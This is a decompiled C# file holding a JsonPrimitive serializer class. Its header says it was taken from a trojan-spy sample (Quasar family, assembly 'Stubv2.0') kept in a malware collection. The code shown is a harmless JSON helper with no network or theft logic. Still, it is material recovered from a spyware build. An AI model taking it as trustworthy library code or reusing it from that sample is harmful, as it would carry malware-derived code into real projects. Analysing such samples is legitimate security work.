// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.JSON.JsonPrimitive
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Globalization;
using System.IO;
using System.Text;

namespace NoiseMe.Drags.App.Models.JSON
{
  public class JsonPrimitive : JsonValue
  {
    private object value;
    private static readonly byte[] true_bytes = Encoding.UTF8.GetBytes("true");
    private static readonly byte[] false_bytes = Encoding.UTF8.GetBytes("false");

    public JsonPrimitive(bool value) => this.value = (object) value;

    public JsonPrimitive(byte value) => this.value = (object) value;

    public JsonPrimitive(char value) => this.value = (object) value;

    public JsonPrimitive(Decimal value) => this.value = (object) value;

    public JsonPrimitive(double value) => this.value = (object) value;

    public JsonPrimitive(float value) => this.value = (object) value;

    public JsonPrimitive(int value) => this.value = (object) value;

    public JsonPrimitive(long value) => this.value = (object) value;

    public JsonPrimitive(sbyte value) => this.value = (object) value;

    public JsonPrimitive(short value) => this.value = (object) value;

    public JsonPrimitive(string value) => this.value = (object) value;

    public JsonPrimitive(DateTime value) => this.value = (object) value;

    public JsonPrimitive(uint value) => this.value = (object) value;

    public JsonPrimitive(ulong value) => this.value = (object) value;

    public JsonPrimitive(ushort value) => this.value = (object) value;

    public JsonPrimitive(DateTimeOffset value) => this.value = (object) value;

    public JsonPrimitive(Guid value) => this.value = (object) value;

    public JsonPrimitive(TimeSpan value) => this.value = (object) value;

    public JsonPrimitive(Uri value) => this.value = (object) value;

    public JsonPrimitive(object value) => this.value = value;

    public object Value => this.value;

    public override JsonType JsonType
    {
      get
      {
        if (this.value == null)
          return JsonType.String;
        switch (Type.GetTypeCode(this.value.GetType()))
        {
          case TypeCode.Object:
          case TypeCode.Char:
          case TypeCode.DateTime:
          case TypeCode.String:
            return JsonType.String;
          case TypeCode.Boolean:
            return JsonType.Boolean;
          default:
            return JsonType.Number;
        }
      }
    }

    public override void Save(Stream stream, bool parsing)
    {
      switch (this.JsonType)
      {
        case JsonType.String:
          stream.WriteByte((byte) 34);
          byte[] bytes1 = Encoding.UTF8.GetBytes(this.EscapeString(this.value.ToString()));
          stream.Write(bytes1, 0, bytes1.Length);
          stream.WriteByte((byte) 34);
          break;
        case JsonType.Boolean:
          if ((bool) this.value)
          {
            stream.Write(JsonPrimitive.true_bytes, 0, 4);
            break;
          }
          stream.Write(JsonPrimitive.false_bytes, 0, 5);
          break;
        default:
          byte[] bytes2 = Encoding.UTF8.GetBytes(this.GetFormattedString());
          stream.Write(bytes2, 0, bytes2.Length);
          break;
      }
    }

    public string GetFormattedString()
    {
      switch (this.JsonType)
      {
        case JsonType.String:
          if (this.value is string || this.value == null)
          {
            string str = this.value as string;
            if (string.IsNullOrEmpty(str))
              return "null";
            return str.Trim('"');
          }
          return this.value is char ? this.value.ToString() : throw new NotImplementedException("GetFormattedString from value type " + (object) this.value.GetType());
        case JsonType.Number:
          string str1 = this.value is float || this.value is double ? ((IFormattable) this.value).ToString("R", (IFormatProvider) NumberFormatInfo.InvariantInfo) : ((IFormattable) this.value).ToString("G", (IFormatProvider) NumberFormatInfo.InvariantInfo);
          return str1 == "NaN" || str1 == "Infinity" || str1 == "-Infinity" ? "\"" + str1 + "\"" : str1;
        default:
          throw new InvalidOperationException();
      }
    }
  }
}
